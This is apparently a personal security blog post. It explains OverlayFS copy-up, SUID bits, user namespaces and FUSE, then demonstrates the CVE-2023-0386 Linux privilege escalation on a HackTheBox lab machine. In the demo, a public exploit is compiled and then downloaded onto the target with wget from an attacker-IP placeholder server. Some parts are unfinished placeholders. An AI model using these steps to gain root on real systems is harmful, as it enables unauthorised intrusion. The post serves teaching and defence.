---
title: OverlayFS - Copy-up to Privilege Escalation(CVE-2023-0386)
date: 2026-06-05 13:57:00 +/-TTTT
categories: [CVE, PRIVILEGE ESCALATION, VULNERABILITY]
tags: [linux, priv_esc, cve]     # TAG names should always be lowercase
---

Hey everyone, welcome to **Bluewh4l3 Byt3s!** Technically, this is my second blog post—my very first was a TryHackMe writeup over on Medium a long time ago—but this marks the official launch of this site. Today, we’re diving deep into OverlayFS and a critical CVE tied to it. We will be breaking down how it works under the hood and how it can be exploited, so I hope you find it valuable. Let’s jump right in!

> Before jumping into the CVE, we first need to understand whats overlayFS and how does it work and what makes it vulnerable. so bear with me for sometime. I'll give you a clear background information on overlayFS, so you'll understand the CVE much clearly.
PS: It's gonna be a bit long.
{: .prompt-info }

## What's OverlayFS?
OverlayFS stands for Overlay File System. overlayFS is a feature of linux kernel that combines two filesystems(directories)  and shows it as a single unified view to the user. It gives an illusion of a single filesystem to the user but under the hood it combines two filesystems - upper and lower and shows it as a single one. 

![tranpsarent-sheet-example](/assets/img/transparentsheet.png)

- Think of overlayFS as a combined view when we put a transparent sheet on top of a drawing, through this sheet we can see the entire drawing.
- We cannot change the drawing but for a person viewing through the sheet, they can add additional things by drawing on the transparent sheet without making any changes on the original drawing and hence the original drawing becomes like a read-only thing.
- To the end user, the additional changes along with the base layer gives a combined view.
- Now lets look at the components of overlayFS based on this analogy:

lower layer - The base drawing

upper layer - The transparent sheet

merged view(overlayFS) - The combined view when someone looks through both the layers

## OverlayFS in action - How Docker uses it
The best example of an overlayFS are docker containers. Lets look at how docker containers work
- Lets say we wanna pull an ubuntu image from docker, when we run docker pull command it'll first check if the image is available locally if not it'll pull an image from the docker hub.
- Now this docker image is the lower layer. With this image we can create multiple containers. This is where overlayFS comes into play.
- When multiple containers are created and user views each containers, they'll be viewing a single base image of ubuntu which is mostly stored locally at ```/var/lib/docker/``` in linux
- It gives an illusion that user is viewing an entire ubuntu filesystem of its own.
- When user wants to make any changes in the container(merged view), then that change is recorded in a separate directory: ```/var/lib/docker/overlay2/container-cache-id/diff/``` but the base image of ubuntu never changes. It remains same across all the containers.


## Copy-up operation in overlayFS
Now the important thing that comes is the copy-up operation in overlayFS. Like I explained earlier, when a user makes any changes in the merged view, that change is stored in another directory. Now changes can be of two types: something new is created in the merged view which does not exists in the lower layer or making edits to something which exists in the lower layer.
- As we already know we cannot directly edit anything in the lower layer, so when user tries to make any edits to any file which already exists in the lower layer, kernel triggers a copy-up operation.
- Meaning, whichever file user tries to edit, kernel makes a copy of that file and stores in the upper layer.
- User works on the copy of the file rather than the original one in the lower layer.
- Copy-up is only triggered when user tries to modify an existing file, no copy-up is triggered for read operation or a new file creation.
- Any attempt to change or edit a file in the lower layer will trigger a copy-up.
- Copy-up also copies the file attributes like permission from lower layer to upper layer and how kernel handles this permission mapping from lower to upper layer is where the vulnerability lies.

This is what a copy-up operation looks like.

## What's SUID bit?
Now another thing to understand is SUID bit most of you might already know this(you can skip to the namespace section) but for the sake of this blog I'll explain it. SUID bit is a special permission bit that can be used to execute a file/binary with the owner's permission.

Lets say a binary called test is owned by root and the SUID bit for this file than a normal user can execute this file with root permission.

![suid_bit](/assets/img/SUID.jpg)

## The User Namespace
A user namespace is a linux security feature that lets a process to have an isolated environment which gives the process the illusion that it has full access to the entire system(within the isolated environment) But in reality it just have a normal user permission within the host system allocated by the kernel. Kernel will keep a UID/GID mapping which will look something like this:
![uid_gid_map](/assets/img/mapping.png)

### Permission mapping between host and user namespace
- The host system maintains a mapping that translates the user and group IDs (UIDs/GIDs) used inside a namespace to distinct, unprivileged IDs on the host system.
- If a process is running as root(uid=0,gid-0) in the namespace, then the same process will be mapped to a low privileged user in the host(uid=1000,gid=1000).

## CVE-2023-0386 - Privilege Escalation using OverlayFS subsytem flaw
Now lets look at the CVE itself. CVE-2023-0386 is a privilege escalation vulnerability that allows a low privileged local linux user to gain root access using a flaw in the ovrelayFS subsystem.
- CVE-2023-0386 occurs because the Linux kernel did not properly validate the UID/GID mapping of a file's owner during an OverlayFS copy-up operation. An attacker can create a file inside an unprivileged user namespace where they appear to be as a root user(UID=0.GID=0) within that namespace and set the SUID bit on the file. When OverlayFS(the overlayFS driver which is part of the kernel) performs a copy-up, the kernel blindly trusts the file's ownership information from the namespace without verifying that the file owner's UID/GID has a valid mapping to the host user namespace. As a result, the kernel copies the file into the upper layer while preserving its privileged metadata(In this case the root ownership and the set SUID bit).

- After the copy-up is completed, the attacker exits the user namespace and executes the copied file from the upper layer. Because the file now exists on the host filesystem as a root-owned SUID executable, executing it causes the program to run with host root privileges, resulting in a local privilege escalation.
- A local user permitted to mount overlay mounts in user namespaces can take advantage of this flaw for local privilege
    escalation.
- Affected linux kernel versions are from ```5.11 to 6.1.8(Including)```

### FUSE (Filesystem in Userspace)
- FUSE is a software interface for unix-like operating systems that allows unprivileged users to create/mount custom filesystems without making any edits to the kernel.
- This is achieved by running the custom filesystem code in userspace instead of kernel.
- Now coming to how FUSE actually helps with this vulnerability, Any file created inside a FUSE filesystem inherits whatever permissions the user-space handler gives it. Since the kernel isn't running the underlying filesystem code, it blindly trusts what the FUSE daemon reports—which is exactly how this boundary gets exploited.
- Now, if we create a root owned binary with SUID bit set and tell the kernel that this binary is host root owned with SUID bit set, then kernel will simply believe it and when user triggers the copy-up of this binary, kernel will directly copy this file to the upper directory of which we have configured foe overlayFS whbich is in the host system.

<!-- ### How the exploit works? - REMOVE
- For the exploit to work, first we need to SUID binary in the lower layer.
- Normally a low privileged user cannot create file which is owned by root or even set SUID bit of file owned by root in the host system. But you probably might be thinking we can use the user namespace for this right? Like I previously explained anyone inside user namespace could be root right?
- Well here's where things get a little tricky. Kernel does allows any file within the namespace to be owned by root or even SUID but can be set, because user within namespace has the CAP_FOWNER capabilities but within the host system, the same file cannot have host root ownership.
- The reason for that is a normal user namespace uses the host machine's filesystem like ext4, which doesn't let unprivileged user create a file that appears to be owned by the host root.
- To bypass that, we'll be using something like FUSE(Filesystem in Userspace) -->

### How the exploit works? - NEW
- First we need to be able to create a root owned file and change the file's SUID bit, for that we'll need to create a user namespace.
- Now we need a custom filesystem that'll tell the kernel that the file is actually owned by root. For this we'll be using a FUSE program(written in C code)amd we'll provide a target directrory(within the user namespace) as an argument to the program.
- FUSE program will interact with kernel and mount this directory
- Now we'll be creating an overlayFS with lower layer as the FUSE mount and upper directory as a world writable host directory(something like /tmp).
- Now we'll create a binary(mostly a bash shell) and trigger a copy-up operation by simply using the touch command on the binary.
- Due to the underlying flaw in the overlayFS subsystem, it'll copy the binary to the /tmp directory while keeping the UID=0 and SUID bit.



### Exploitation in Action
> Spoiler Alert!!. I'll be using the HTB machine called twomillion to demonstrate this vulnerability. Assume that we have initial access to the target machine(I'm skipping the initial access part for the sake of this blog)
{: .prompt-info }

- Let's look at the kernel version and see if its vulnerable.

    ```console
$ uname -r
5.15.70-051570-generic
    ```
    ![kernel_version](/assets/img/kernel_version.png)
- So the specific kernel version 5.15 is indeed a vulnerable version.
- Now to exploit this we'll be using the public exploit [CVE-2023-0386](https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c)
- I'll just explain what this exploit does in short, it first creates a FUSE filesystem using libfuse and  ```FILL THIS LATER ON```
- Now install libfuse library in the attacking machine if you don't have it already. If you are using kali linux, then you install it using the below command
    ```bash
    sudo apt install fuse
    ```
- Compile the exploit C file on the attacking machine
    ```bash
    gcc exploit.c -o exploit
    ```
- Now transfer this compiled file ```exploit``` to the target machine under the /tmp directory

    *Attacker's machine*
    ```bash
    python3 -m http.server
    ```
    ![http_listener](/assets/img/http_listener.png)

    *Victim's machine*
    ```bash
    wget http://<ATTACKER-MACHINE-IP>:8000/exploit
    ```
    ![fetch_exploit](/assets/img/exploit_received.png)

- Now change the execute permission of the file and execute it
    ```bash
    chmod +x exploit
    ```

    ```bash
    ./exploit
    ```

- If we check the current user, we can see we are root now. We have successfully escalated our privileges from a normal user to root.
![priv_esc](/assets/img/priv_esc.png)

## Mitigating CVE-2023-0386
- Immediate mitigation step would be to apply vendor specific kernel updates. You can refer the debian's security patch tracker: [Debian security path tracker](https://security-tracker.debian.org/tracker/CVE-2023-0386)
- 


    

